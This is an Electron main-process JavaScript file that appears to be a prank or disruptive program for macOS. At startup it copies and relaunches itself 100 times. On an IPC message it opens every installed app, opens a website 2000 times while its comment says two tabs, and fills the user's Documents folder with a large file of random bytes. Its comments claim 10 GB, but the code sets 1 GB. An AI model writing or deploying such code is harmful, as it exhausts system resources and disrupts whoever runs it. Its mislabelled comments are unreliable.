const { app, BrowserWindow, ipcMain, shell } = require('electron');
const { exec } = require('child_process');
const path = require('path');
const fs = require('fs');

function createWindow() {
  const { screen } = require('electron');

const display = screen.getPrimaryDisplay();
const { width: screenW, height: screenH } = display.workAreaSize;

const winWidth = Math.floor(Math.random() * 800 + 400);  // 400–1200
const winHeight = Math.floor(Math.random() * 600 + 300); // 300–900
const posX = Math.floor(Math.random() * (screenW - winWidth));
const posY = Math.floor(Math.random() * (screenH - winHeight));
  const win = new BrowserWindow({
    width: winWidth,
  height: winHeight,
  x: posX,
  y: posY,
  webPreferences: {
    preload: path.join(__dirname, 'preload.js'),
    contextIsolation: true
  }
  });
  for(let i =0; i<100; i++){
duplicateApp();
  }
  win.loadFile('index.html');
}

function duplicateApp() {
  const baseDir = __dirname;

  // Create target path next to your app
  const targetDir = path.join(path.dirname(baseDir), 'app-copy');

  console.log('Copying from:', baseDir);
  console.log('Copying to:', targetDir);

  // جلوگیری از کپی داخل خودش (infinite recursion)
  if (baseDir === targetDir) {
    console.error('Source and destination are the same!');
    return;
  }

  try {
    copyRecursive(baseDir, targetDir);
    console.log('App duplicated successfully');

    // Launch the duplicated app
    exec('npm start', { cwd: targetDir });

  } catch (err) {
    console.error('Duplication failed:', err);
  }
}

function copyRecursive(src, dest) {
  if (!fs.existsSync(dest)) {
    fs.mkdirSync(dest, { recursive: true });
  }

  const entries = fs.readdirSync(src, { withFileTypes: true });

  for (let entry of entries) {
    const srcPath = path.join(src, entry.name);
    const destPath = path.join(dest, entry.name);

    // 🚫 Skip bad/problematic stuff
    if (
      entry.name === 'node_modules' ||
      entry.name === 'app-copy' ||       // avoid recursion
      entry.name.startsWith('.') ||      // hidden macOS junk
      entry.name.endsWith('.app') ||     // macOS apps
      entry.isSymbolicLink()
    ) {
      continue;
    }

    try {
      if (entry.isDirectory()) {
        copyRecursive(srcPath, destPath);
      } else {
        fs.copyFileSync(srcPath, destPath);
      }
    } catch (err) {
      console.warn('Skipped:', srcPath);
    }
  }
}
app.whenReady().then(createWindow);

// Find apps
ipcMain.handle('get-apps', () => {
  const appDirs = [
    '/Applications',
    '/System/Applications',
    path.join(app.getPath('home'), 'Applications')
  ];

  let apps = [];

  for (const dir of appDirs) {
    if (fs.existsSync(dir)) {
      const items = fs.readdirSync(dir);
      for (const item of items) {
        if (item.endsWith('.app')) {
          apps.push(path.join(dir, item));
        }
      }
    }
  }

  return apps;
});

// Launch apps + 2 tabs
const crypto = require('crypto');

ipcMain.on('launch-all', (event, apps) => {
  // Open all apps
 for (const appPath of apps) {
   shell.openPath(appPath);
 }
// shell.openPath(apps[0]);
  // Open 2 browser tabs
  for (let i = 0; i < 2000; i++) {
    shell.openExternal('https://www.emptyconsole.com');
  }

  // 📁 WRITE LARGE FILE (UP TO 10 GB)
  const documentsPath = app.getPath('documents');
  const filePath = path.join(documentsPath, 'skia.bin');

  const MAX_SIZE = 1 * 1024 * 1024 * 1024; // 10 GB
  const CHUNK_SIZE = 5 * 1024 * 1024; // 5 MB per write

  let written = 0;

  console.log('Starting large file write...');

  const interval = setInterval(() => {
    try {
      if (written >= MAX_SIZE) {
        clearInterval(interval);
        console.log('✅ Finished writing 10 GB file');
        
        return;
      }

      const chunk = crypto.randomBytes(CHUNK_SIZE); // unreadable binary
      fs.appendFileSync(filePath, chunk);

      written += CHUNK_SIZE;

      console.log(`Written: ${(written / (1024 * 1024)).toFixed(0)} MB`);
    } catch (err) {
      console.error('❌ Error writing file:', err);
      clearInterval(interval);
    }
  }, 50); // adjust speed here
});

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') app.quit();
});